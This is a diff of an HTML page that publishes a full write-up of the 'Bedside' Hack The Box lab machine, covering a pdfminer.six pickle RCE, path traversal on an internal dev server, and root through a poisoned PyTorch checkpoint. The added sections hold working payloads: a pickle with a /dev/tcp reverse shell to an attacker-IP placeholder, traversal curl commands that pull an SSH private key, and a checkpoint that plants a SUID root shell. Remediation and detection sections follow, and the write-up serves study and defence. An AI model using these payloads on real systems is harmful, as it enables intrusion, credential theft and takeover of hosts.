@@ -4,15 +4,11 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Bedside — HTB Writeup (Lanky)</title>
-  <meta name="description" content="Hack The Box: Bedside — Medium Linux. pdfminer pickle RCE → container pivot → PyTorch checkpoint deserialization to root.">
+  <meta name="description" content="Hack The Box: Bedside — Medium Linux. A hidden research vhost feeds uploads to a vulnerable pdfminer.six worker (pickle RCE), an internal ESM dev server leaks the developer SSH key by path traversal, and a sudo-approved trainer deserialises an attacker-supplied PyTorch checkpoint as root.">
   <link rel="stylesheet" href="../assets/style.css?v=5">
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127875;</text></svg>">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#129658;</text></svg>">
 </head>
 <body>
-  <div class="banner">
-    ◷ <strong>Active Season 11 box</strong> — full technical writeup publishes once the season closes. Summary &amp; lessons below.
-  </div>
-
   <header class="nav">
     <div class="wrap">
       <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
@@ -24,67 +20,320 @@
     <a class="back" href="../index.html#lab">back to writeups</a>
     <img class="wu-logo" src="../assets/logos/bedside.png" alt="Bedside logo">
     <h1 style="margin-top:16px;">Bedside</h1>
-    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Bedside" target="_blank" rel="noopener">app.hackthebox.com/machines/Bedside</a></div>
+    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Bedside" target="_blank" rel="noopener">app.hackthebox.com/machines/Bedside</a> · Season 11</div>
     <div class="machine-meta">
       <span class="pill os-linux">Linux</span>
       <span class="pill diff-medium">Medium</span>
       <span class="pill season">Season 11</span>
-      <span class="pill">Deserialization · Container pivot</span>
+      <span class="pill">Deserialization ×2</span>
+      <span class="pill">Container pivot</span>
       <span class="pill flagp">User</span>
       <span class="pill flagp">Root</span>
       <span class="pill rooted">● Completed</span>
-      <span class="pill pending">writeup after season</span>
     </div>
 
     <div class="callout">
-      <span class="tag">Summary</span>
-      A medical-research-themed Linux target. A hidden research virtual host exposed an unauthenticated upload that
-      fed a vulnerable <strong>pdfminer.six</strong> worker — a crafted PDF triggered <strong>unsafe pickle
-      deserialization</strong> for a shell as <code>datawrangler</code> inside a container. An internal ESM service
-      leaked the <code>developer</code> SSH key via <strong>path traversal</strong>, and that account's
-      <strong>sudo-run PyTorch trainer loaded an attacker-controlled checkpoint</strong> — a second unsafe
-      deserialization — for <strong>root</strong>.
+      <span class="tag">TL;DR</span>
+      A Linux target built around a medical research workflow, and a box with <strong>two unsafe
+      deserialisation bugs</strong> bracketing a path traversal. A hidden research virtual host takes
+      unauthenticated uploads and feeds them to a vulnerable <strong>pdfminer.six</strong> worker, where a
+      crafted PDF referencing an attacker-supplied CMap triggers <strong>pickle</strong> execution inside a
+      container. An internal ESM development service leaks the host's <code>developer</code> SSH key by
+      <strong>path traversal</strong>. Finally, a sudo-approved training script loads the newest
+      <strong>PyTorch checkpoint</strong> from a shared datastore — pickle again, this time as root.
     </div>
 
-    <h2><span class="num">01</span>Why the full writeup is held back</h2>
-    <p>
-      Bedside is a live <strong>Season 11</strong> machine, so — in line with Hack The Box's guidance on active
-      machines — I'm not publishing a step-by-step reproduction. The complete writeup (vhost discovery, the pdfminer
-      pickle RCE, the container pivot / ESM traversal, and the PyTorch-checkpoint privesc, with commands and
-      remediation) goes live here <strong>once the season closes</strong>.
-    </p>
-
-    <h2><span class="num">02</span>The interesting bits (no spoilers)</h2>
-    <h3>Deserialization, twice — pickle then PyTorch</h3>
-    <p>
-      Both the foothold and root came from the same root cause in two forms: <strong>unsafe deserialization</strong>.
-      First a malicious <strong>pickle</strong> delivered through a PDF that <code>pdfminer.six</code> processed;
-      then a malicious <strong>PyTorch checkpoint</strong> loaded by a trusted training script. "Loading" untrusted
-      data is executing it.
-    </p>
-    <h3>Container isolation that wasn't</h3>
-    <p>
-      The initial shell landed <strong>inside a container</strong>, but an internal development service was reachable
-      from it and <strong>path-traversal on that service leaked host files</strong> — including an SSH private key.
-      A reminder that a container boundary is only as strong as what it can still talk to.
-    </p>
-
-    <h2><span class="num">03</span>Takeaways</h2>
-    <ul>
-      <li><strong>Never deserialize untrusted input</strong> — <code>pickle</code> and <code>torch.load</code> both execute code; use safe formats / <code>weights_only</code>.</li>
-      <li><strong>Fuzz for virtual hosts</strong> — the whole chain started with an unadvertised <code>research.</code> vhost.</li>
-      <li><strong>Containers aren't a security boundary by themselves</strong> — audit what internal services a compromised container can reach.</li>
-      <li><strong>Sudo rules that load data are dangerous</strong> — a "safe" script becomes RCE when it consumes attacker-controlled files.</li>
-    </ul>
+    <dl class="fact">
+      <dt>Target</dt><dd><b>bedside.htb</b> · hidden vhost <b>research.bedside.htb</b></dd>
+      <dt>Host OS</dt><dd>Debian — OpenSSH 10.0p2, Apache 2.4.68</dd>
+      <dt>Foothold</dt><dd>pdfminer.six 20250506 unsafe CMap deserialization → container as <code>datawrangler</code></dd>
+      <dt>Host pivot</dt><dd>Internal ESM service (TCP 3000) path traversal → developer SSH key</dd>
+      <dt>Privesc</dt><dd>Unsafe PyTorch checkpoint load through a NOPASSWD sudo rule</dd>
+    </dl>
 
     <div class="callout todo">
-      <span class="tag">Coming after Season 11</span>
-      Full technical walkthrough with the vhost discovery, pdfminer pickle RCE, ESM path traversal, and the PyTorch-checkpoint-to-root chain.
+      <span class="tag">The chain in one line</span>
+      vhost fuzzing finds <code>research.bedside.htb</code> → upload a gzipped pickle plus a PDF referencing it
+      as a CMap → reverse shell as <code>datawrangler</code> in the PDF worker container → internal ESM service
+      on 3000 traverses out to <code>/home/developer/.ssh/id_rsa</code> → SSH as <code>developer</code> →
+      plant a malicious <code>.pt</code> checkpoint in the shared datastore → run the approved trainer under
+      sudo → SUID shell on a non-<code>nosuid</code> filesystem → root.
     </div>
+
+    <h2><span class="num">01</span>Enumeration</h2>
+    <pre data-lang="bash"><code>sudo nmap -Pn -sS -p- --min-rate 2000 -T4 --reason &lt;target&gt; -oA scans/all-ports
+echo '&lt;target&gt; bedside.htb' | sudo tee -a /etc/hosts</code></pre>
+    <table>
+      <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+      <tr><td>22</td><td>ssh</td><td>OpenSSH 10.0p2 (Debian)</td></tr>
+      <tr><td>80</td><td>http</td><td>Apache 2.4.68 (Debian) — Bedside Clinic, largely static</td></tr>
+      <tr><td>3000</td><td>—</td><td>Filtered externally; reachable from inside later</td></tr>
+    </table>
+    <p>
+      The main site is a dead end: content discovery finds the PHP entry point and stock Apache assets and no
+      application workflow. The result that matters comes from <strong>virtual-host</strong> fuzzing rather than
+      directory fuzzing:
+    </p>
+    <pre data-lang="bash"><code>ffuf -u http://bedside.htb/ \
+  -H 'Host: FUZZ.bedside.htb' \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+  -fs 7189 -ac
+# research  [Status: 200, Size: 3152, Words: 313, Lines: 80]
+
+echo '&lt;target&gt; research.bedside.htb' | sudo tee -a /etc/hosts</code></pre>
+    <p>
+      The research vhost is a completely separate application with its own trust boundary: an
+      <strong>unauthenticated upload form</strong> for medical images, DICOM, PDFs and archives, which states
+      that some formats are converted before AI training. That sentence is the tell — conversion means an
+      asynchronous backend parser, not passive storage. The response header seals it:
+      <code>X-Powered-By: pdfminer.six</code>.
+    </p>
+
+    <h2><span class="num">02</span>Foothold — pdfminer.six CMap pickle RCE</h2>
+    <p>
+      The backend runs <strong>pdfminer.six 20250506</strong>, which is vulnerable to unsafe deserialisation in
+      its CMap-loading path. A PDF can name an encoding that resolves to an attacker-controlled compressed
+      pickle; when the worker converts the document, Python deserialises that object and calls its reduction
+      function.
+    </p>
+    <p>Both halves are uploaded through the same unauthenticated form — the pickle, then the trigger PDF:</p>
+    <pre data-lang="python"><code>#!/usr/bin/env python3
+import gzip, pickle
+
+class Payload:
+    def __reduce__(self):
+        command = (
+            "__import__('os').system("
+            "\"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1'\""
+            ") or {}"
+        )
+        return eval, (command,)
+
+with gzip.open("bedside.pickle.gz", "wb") as output:
+    pickle.dump(Payload(), output)</code></pre>
+    <p>
+      The PDF's font object references the uploaded CMap by absolute path, URL-encoded, and <em>without</em> the
+      <code>.pickle.gz</code> suffix — pdfminer appends it during resolution:
+    </p>
+    <pre data-lang="text"><code>/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fbedside</code></pre>
+    <pre data-lang="bash"><code>curl -F 'uploadFile=@bedside.pickle.gz;type=application/gzip' http://research.bedside.htb/
+curl -F 'uploadFile=@trigger.pdf;type=application/pdf'        http://research.bedside.htb/
+rlwrap nc -lvnp 4444
+# uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
+# hostname: data-wrangler   cwd: /app</code></pre>
+
+    <h2><span class="num">03</span>Inside the container</h2>
+    <p>The worker source explains the automatic processing, and hands over the rest of the map:</p>
+    <pre data-lang="python"><code>UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
+OUTPUT_DIR = "/datastore/staging"
+TIMEOUT = 10
+SLEEP_INTERVAL = 30
+
+subprocess.run(["pdf2txt.py", pdf_path, "-o", output_file], timeout=TIMEOUT, check=True)</code></pre>
+    <p>
+      Two useful properties fall out. The worker rescans every 30 seconds, so a malicious PDF left in the upload
+      directory produces a <strong>recurring</strong> reverse shell — handy, because shells on this box die.
+      And <code>/datastore</code> is a <strong>shared volume</strong>, which becomes the privilege-escalation
+      bridge later. <code>datawrangler</code> can read the uploads but cannot rename the web-server-owned PDFs.
+    </p>
+
+    <h2><span class="num">04</span>Host file disclosure — the internal ESM service</h2>
+    <p>
+      Port 3000 was filtered from outside but answers on <code>127.0.0.1</code> from inside the container. It is
+      an ESM development server, complete with hot-module-reload endpoints. Conventional API paths 404; the
+      weakness is in a package-resolution route, and it needs <code>--path-as-is</code> so curl does not
+      normalise the traversal away:
+    </p>
+    <pre data-lang="bash"><code>curl http://127.0.0.1:3000/@hmr
+
+curl --path-as-is -sS \
+  'http://127.0.0.1:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&amp;module=1'
+# developer:x:1000:1000:developer,,,:/home/developer:/bin/bash</code></pre>
+    <p>The same primitive reads the private key straight off the host:</p>
+    <pre data-lang="bash"><code>curl --path-as-is -sS \
+  'http://127.0.0.1:3000/pr/x/y@99/../../../../../../../../../../home/developer/.ssh/id_rsa?raw=1&amp;module=1' \
+  &gt; developer_id_rsa
+chmod 600 developer_id_rsa
+ssh -i developer_id_rsa developer@&lt;target&gt;</code></pre>
+    <div class="flag"><span class="label">user.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">05</span>The sudo rule</h2>
+    <pre data-lang="bash"><code>sudo -l
+# (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py</code></pre>
+    <p>
+      The rule matches that <em>exact</em> command. Adding arguments — <code>--epochs 1</code>, anything — falls
+      outside it and sudo asks for a password. So the attack has to live entirely in what the script reads, not
+      in how it is invoked.
+    </p>
+    <p>
+      What it reads is the newest <code>.pt</code> file in <code>/datastore/checkpoints</code>, loaded through
+      MONAI's <code>CheckpointLoader</code>. PyTorch checkpoints are pickle-based. <code>datawrangler</code> can
+      write to the shared datastore. That is the whole privilege escalation.
+    </p>
+
+    <h2><span class="num">06</span>Root — a poisoned checkpoint</h2>
+    <pre data-lang="python"><code>import os, torch
+
+class Payload:
+    def __reduce__(self):
+        command = (
+            "cp /bin/bash /usr/local/bin/rootbash &amp;&amp; "
+            "chown root:root /usr/local/bin/rootbash &amp;&amp; "
+            "chmod 4755 /usr/local/bin/rootbash"
+        )
+        return os.system, (command,)
+
+torch.save({"model": Payload()}, "/tmp/checkpoint_z_exploit.pt")</code></pre>
+    <p>
+      <code>developer</code> can build the file but cannot traverse into <code>/datastore/checkpoints</code>;
+      <code>datawrangler</code> can write there but is in the container. A one-line HTTP server bridges the two
+      identities:
+    </p>
+    <pre data-lang="bash"><code># developer, on the host
+cd /tmp &amp;&amp; python3 -m http.server 8888 --bind 0.0.0.0
+
+# datawrangler, in the container
+curl -f http://&lt;target&gt;:8888/checkpoint_z_exploit.pt \
+  -o /datastore/checkpoints/checkpoint_z_exploit.pt</code></pre>
+    <pre data-lang="bash"><code>sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
+# TypeError: Expected state_dict to be dict-like, got &lt;class 'int'&gt;.</code></pre>
+    <p>
+      That traceback looks like failure and is not. <code>os.system</code> already ran <em>during</em>
+      deserialisation; the exception happens afterwards, when the trainer tries to use the object as a model
+      state. <strong>An exception after a pickle payload does not undo what the payload already did.</strong>
+    </p>
+
+    <h2><span class="num">07</span>The nosuid lesson</h2>
+    <p>
+      The first attempt dropped the SUID bash in <code>/tmp</code>. The file was root-owned, mode 4755 — and
+      still ran as <code>developer</code>. The mount options explain it:
+    </p>
+    <pre data-lang="bash"><code>mount | grep ' /tmp '
+# tmpfs on /tmp type tmpfs (rw,nosuid,nodev,...)</code></pre>
+    <p>
+      <code>nosuid</code> makes the kernel ignore set-user-ID bits on that filesystem entirely. Moving the payload
+      to <code>/usr/local/bin</code> — ordinary root ext4 — fixed it:
+    </p>
+    <pre data-lang="bash"><code>/usr/local/bin/rootbash -p -c 'whoami; id; cat /root/root.txt'</code></pre>
+    <p>
+      <code>-p</code> matters too: without it bash drops the elevated privileges in some contexts. The decisive
+      indicator is <strong>effective</strong> UID 0, even while the real UID stays <code>developer</code>.
+    </p>
+    <div class="flag"><span class="label">root.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">08</span>If this were your environment</h2>
+
+    <div class="finding">
+      <span class="tag">Finding 1 · Critical</span>
+      <h4>Unsafe PDF deserialization in the conversion worker (pdfminer.six 20250506)</h4>
+      <p>
+        A crafted PDF caused the worker to deserialise an attacker-supplied pickle, giving remote command
+        execution as the processing account.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Upgrade pdfminer.six</strong> and prohibit dynamic CMap loading from upload paths.</li>
+        <li><strong>Isolate conversion</strong> in a sandbox with no network egress, a read-only root filesystem and a short-lived, unprivileged identity.</li>
+        <li><strong>Never deserialise untrusted data with pickle</strong> — directly or through a library that does it for you. Audit dependencies for implicit pickle use.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-2 flaw remediation · SI-10 input validation · SC-7 boundary protection · CM-7 least functionality<br>
+        <b>CWE:</b> CWE-502 deserialization of untrusted data
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 2 · High</span>
+      <h4>Unauthenticated upload feeding an automated parser</h4>
+      <p>
+        Anyone could place arbitrary files where a background worker would parse them, and retrieve them under a
+        predictable <code>/uploads/</code> path. The extension allow-list did nothing, because the dangerous
+        formats were on it.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Require authentication</strong> on the research portal, and rate-limit submissions.</li>
+        <li><strong>Store uploads outside the web root</strong> with randomised names, so uploaded content is never directly addressable.</li>
+        <li><strong>Validate content, not extensions</strong> — an allow-list of file types is not a safety control when the listed types are the ones being parsed.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> AC-3 access enforcement · IA-2 identification &amp; authentication · SI-10 input validation<br>
+        <b>CWE:</b> CWE-434 unrestricted upload of file with dangerous type
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 3 · Critical</span>
+      <h4>Internal ESM dev service allows arbitrary host file disclosure</h4>
+      <p>
+        A development server, reachable only internally, exposed a package-resolution route vulnerable to path
+        traversal — which read <code>/etc/passwd</code> and then the <code>developer</code> SSH private key off
+        the host filesystem.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Remove the development server from the deployment</strong>, or upgrade it and disable the module-resolution route.</li>
+        <li><strong>Canonicalise every resolved path</strong> and assert it stays within the intended root before serving.</li>
+        <li><strong>Run it in a constrained namespace with no access to host secrets</strong> — home directories in particular.</li>
+        <li><strong>Rotate the exposed key</strong> and restrict its file permissions. "Internal only" is not a control once anything else is compromised.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-10 input validation · AC-6 least privilege · SC-7 boundary protection · IA-5 authenticator management · CM-7 least functionality<br>
+        <b>CWE:</b> CWE-22 path traversal
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 4 · Critical</span>
+      <h4>Root sudo rule that deserialises attacker-writable checkpoints</h4>
+      <p>
+        A NOPASSWD sudo rule ran a complex Python trainer as root, and that trainer loaded pickle-based PyTorch
+        checkpoints from a directory a container account could write to. The privileged command never needed to
+        be abused directly — only its input.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Load checkpoints with <code>weights_only=True</code></strong>, or move to a non-executable format such as safetensors.</li>
+        <li><strong>Validate provenance and ownership</strong> — never load a checkpoint writable by a less-privileged identity, and verify a signature or checksum from a trusted manifest.</li>
+        <li><strong>Remove the sudo rule</strong>, or replace it with a minimal, immutable, input-validating privileged helper. A full ML training script is far too much code to run as root.</li>
+        <li><strong>Do not share a writable volume between a container workload and a privileged host process</strong> — that volume is a trust boundary and was treated as a convenience.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> AC-6 least privilege · SI-7 software &amp; information integrity · CM-5 access restrictions for change · SC-28 protection of information at rest<br>
+        <b>CWE:</b> CWE-502 deserialization of untrusted data · CWE-732 incorrect permission assignment
+      </div>
+    </div>
+
+    <h2><span class="num">09</span>Detection — the blue-team side</h2>
+    <ul>
+      <li><strong>The PDF worker spawning shells</strong> or making outbound connections — a converter should talk to nothing.</li>
+      <li><strong>Traversal patterns in the dev-server request log</strong> (<code>../</code> sequences, <code>raw=1&amp;module=1</code>), and any read of a home directory or <code>.ssh</code> path by a service account.</li>
+      <li><strong>New or modified <code>.pt</code> files in the checkpoint directory</strong>, with ownership that does not match the training pipeline.</li>
+      <li><strong>Privileged sudo invocations followed by new SUID binaries</strong> anywhere on disk.</li>
+    </ul>
+
+    <h2><span class="num">10</span>Takeaways</h2>
+    <ul>
+      <li><strong>Virtual-host discovery can reveal an entirely separate application and trust boundary.</strong> The main site had nothing; the box was on another vhost.</li>
+      <li><strong>Extension allow-lists do not make complex parsing safe.</strong> The dangerous formats were the permitted ones.</li>
+      <li><strong>A port filtered externally can still be the best target</strong> once you are inside — and dev servers are not safe merely because they bind internally.</li>
+      <li><strong>An exception after deserialisation does not undo the command that already ran.</strong> Check the effect, not the traceback.</li>
+      <li><strong>Exact sudo command matching matters.</strong> Adding one argument moved me outside the rule.</li>
+      <li><strong>SUID depends on mount options.</strong> <code>nosuid</code> on <code>/tmp</code> silently defeats the classic payload — and <code>bash -p</code> is what preserves the effective UID.</li>
+      <li><strong>Shared volumes bridge identities.</strong> A container user and a privileged host process met in <code>/datastore</code>, and that meeting was root.</li>
+    </ul>
 
     <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
   </article>
 
-  <footer><div class="wrap">Bedside · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
+  <footer><div class="wrap">Bedside · Season 11 · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
 </body>
 </html>
